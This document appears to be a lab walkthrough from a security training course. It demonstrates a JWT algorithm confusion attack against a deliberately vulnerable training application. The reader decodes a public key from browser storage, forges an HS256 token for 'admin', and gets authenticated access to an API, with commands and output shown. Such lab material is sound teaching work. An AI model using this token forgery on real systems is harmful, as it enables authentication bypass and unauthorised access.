## Algorithm Confussion

##### Step 1:

* Open browser

![](img/open-browser.png)


##### Step 2:

* open `http://sls-training-ui.s3-website-us-east-1.amazonaws.com/` to access the XML-Uploder application.

![](img/login-page.png)

##### Step 3:

* Click `Shift + f9` or right click on top of the browser and click on `Web Developer` to select the `Storage Inspect` tab.

![](img/local-storage.png)

##### Step 4:

* Click on `Local-Storage` icon on left, and expand.

    * Copy the `guest_public_key` and `guest_token`
    
    ![](img/click-local-storage.png)

##### Step 5:

* Open Terminal

![](img/open-browser.png)


##### Step 6:

* Run `node`

    ```commandline
    root@we45-VirtualBox:/home/we45# node
    > 
    ```
    
##### Step 7:

* Run `const token = <paste your publickey>`

    ```commandline
    > const token  = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyZmt4NEVlMkRWRktMdjBGdlBBZwpRTHpQRUJxYnhLZzQxK0QxMThHSCtzYy9ZT3pENVIrNE1sVHVCNUwrT0w3dndqUzNOclp2ZlY4Nm41eWxNTE1HCkkybG0zNHFLVm5adTJkQ0V4UlNFeDZhUkQwUWw0NWowREN4NG5KV2t1all1SHlVcFNUR2RHOEFsNG5XeGRtWW4KTDhVSlJEdldKZHg3YWlLRWxqMWhtK1g0cFZDeERLTFd5R3ArcnphVG9sVnErZUo1WGVvZ0F3Z3lPNTNlb3hhaworRFk0KzYzSjZQN1FmeHU4UVh1NC90ZWRSL3Z6NTk3Q0pFaTVZb01ndVY2N2NIVElmQVYvTjRJdmhaaERkYm1CCmxrZnRDSE1uTEpFa2hDeWV3MGd0Y3U5S2NpVC83NWY3eFdWVEMxYTkrU2FCdW1OZnZleVFKeGNyL2hoeGp2NXIKS1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="    
    ```
    
##### Step 8:
    
* Run ` Buffer.from(token, 'base64').toString();`

    **Note:** Copy the decoded public key.

    ````commandline
     > Buffer.from(token, 'base64').toString();
    '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2fkx4Ee2DVFKLv0FvPAg\nQLzPEBqbxKg41+D118GH+sc/YOzD5R+4MlTuB5L+OL7vwjS3NrZvfV86n5ylMLMG\nI2lm34qKVnZu2dCExRSEx6aRD0Ql45j0DCx4nJWkujYuHyUpSTGdG8Al4nWxdmYn\nL8UJRDvWJdx7aiKElj1hm+X4pVCxDKLWyGp+rzaTolVq+eJ5XeogAwgyO53eoxak\n+DY4+63J6P7Qfxu8QXu4/tedR/vz597CJEi5YoMguV67cHTIfAV/N4IvhZhDdbmB\nlkftCHMnLJEkhCyew0gtcu9KciT/75f7xWVTC1a9+SaBumNfveyQJxcr/hhxjv5r\nKQIDAQAB\n-----END PUBLIC KEY-----\n'
    >
    ````

##### Step 9:

* Run `.exit`

    ```commandline
    > .exit
    ```
    
##### Step 10:

* Run `touch public_key.pem`

    ```commandline
    root@we45-VirtualBox:/home/we45# touch public_key.pem
    ```
    
##### Step 11:

* Run `vim public_key.pem`

    **Note:** Paste the copied public key and save. 
    
    ```commandline
    Put image
    ```
    
##### Step 12:

* Run `node token_gen.js --file public_key.pem --username admin`

   **Note:** Copy the token
        

    ```commandline
    root@we45-VirtualBox:/home/we45# node token_gen.js --file public_key.pem --username admin
        
    This is your token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODk1Mjc0fQ.XFhJRm1W_58ulrgVJ9_vy7LsGy14VICXCLMQsh8g-nE
    
    ```
    
##### Step 13:

* Run `http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:<copied token>`

    ```commandline
    root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODgwMjg2fQ.29E-i4QD21pvpA41oEJx60haJoOpgqbpzbvE6OK-Exg
    HTTP/1.1 200 OK
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
    Access-Control-Allow-Methods: GET,OPTIONS
    Access-Control-Allow-Origin: *
    Access-Control-Max-Age: 0
    Connection: keep-alive
    Content-Length: 114
    Content-Type: application/json
    Date: Tue, 25 Sep 2018 17:12:14 GMT
    Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: JquwGQ1bb1vr5ev4oFF6R8e5MqbzM-YqyVvEJJKaz7fPN0nRlly3rw==
    X-Amzn-Trace-Id: Root=1-5baa6c6d-a196d3961775849ef9a9ffc4;Sampled=1
    X-Cache: Miss from cloudfront
    X-Success-Request: true
    x-amz-apigw-id: NyXhKFUHoAMFscA=
    x-amzn-RequestId: 25718e25-c0e6-11e8-86e5-dddb808cd601
    
    {
        "decoded": {
            "iat": 1537880286, 
            "status": "hacked", 
            "username": "admin"
        }, 
        "success": "You are successfully authenticated"
    }
    
    ```
